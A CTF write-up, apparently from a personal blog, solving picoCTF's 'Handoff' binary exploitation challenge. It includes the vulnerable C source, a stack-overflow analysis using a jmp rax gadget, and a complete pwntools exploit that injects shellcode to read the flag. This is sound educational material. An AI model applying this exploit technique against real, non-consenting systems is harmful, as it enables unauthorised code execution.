+++
date = '2025-12-16T17:19:27+05:30'
draft = false
title = 'Handoff'
categories = ["picoctf", "binary exploitation"]
+++

#### Analysis:
In this challenge we are provided with the source code and the binary.
##### Step 1:
We will first check the protections with checksec:

![alt](/Images/checksec_handoff.png)

From the above output we can see a few things:
1) That the stack of the binary is executable 
2) There is no protection against buffer overflow since it lacks a stack canary.

From the above observations we can infer that we can inject and execute a shellcode. Now lets look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```
Analyzing the source code we can see that there is a buffer overflow vulnerability in choice number 3 , that is the `feedback` buffer and choice number 1 that is `name` buffer since both of them can hold only 8 bytes but `NAME_LEN` is 32 bytes.

Now opening the binary in ghidra:

![alt](/Images/ghidra_handoff.png)

we can see the name buffer is 0x2e8(744) bytes below return address and hence we can't use this buffer to overwrite the return address since we can insert only 32 bytes into this buffer. A much better alternative will be to use the feedback buffer which is 0x14(20) bytes below the return address and hence can be used to overwrite the return address.
But since the feedback buffer can hold only 32 bytes and also has a null byte(`feedback[7]=0`) we can't use this buffer to insert our shellcode as the null byte forces a premature string termination, which makes our shellcode unreliable.

Hence to insert our shellcode we will be using the msg buffer which can hold 64 bytes.
Now using ROPgadget tool we tried to find a usable gadget for this shellcode execution. We found out a cool gadget :

	0x0040116c : jmp rax

This gadget works since `fgets` function returns the address of the buffer in the ` rax ` register. Hence we can jump to the buffer in which we inserted our shellcode by using the above gadget.
Now we can craft a suitable exploit for this binary.


### Exploitation:
#### Steps:
1) First we will create a recipient to whom we can send a message using option 1.
2) We will then send him the main shellcode to spawn a shell which will be stored in the msg buffer using option 2.
3) At last we will select the 3rd option to send him the feedback which will contain a stub shellcode that will make the instruction pointer move down to the msg buffer/main shellcode . 

We will also have to find the offset between the start of the feedback buffer and the start of the msg buffer so that we make the instruction pointer move to the main shellcode.

#### The exploit script
```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

elf = ELF("./handoff")
context.binary = elf
context.log_level = 'info'

rip_offset = 0x14 
msg_offset = 0x2e0
#Initial Shellcode that will jump to main shellcode:
jmp_rax = 0x0040116c
jmp_dist = msg_offset - rip_offset
stub_shellcode = asm(f'''
                nop
                nop
                nop
                sub rax, {jmp_dist}
                jmp rax
            ''')

payload = flat(
        stub_shellcode,
        b"A" * (rip_offset-len(stub_shellcode)),
        jmp_rax,
    )

# Main shellcode:
main_shellcode = asm(shellcraft.amd64.linux.cat('flag.txt'))

# Creating the process:
p = remote(args.host, args.port)
# First creating a reciepient to whom i can send the shellcode
p.sendline("1".encode())
p.sendline("Anon".encode())

# Then sending the main shellcode which will be placed in the msg buffer:
p.sendline("2".encode())
p.sendline("0".encode())
p.sendline(main_shellcode)

# Then sending the stub shellcode that will make it jump to the main_shellcode:
p.sendline("3".encode())
p.sendline(payload)

p.interactive()
```

#### Running the exploit script:
Running the command:

	python3 exploit.py shape-facility.picoctf.net 59013

We get the flag:

	picoCTF{p1v0ted_ftw_5b992d80}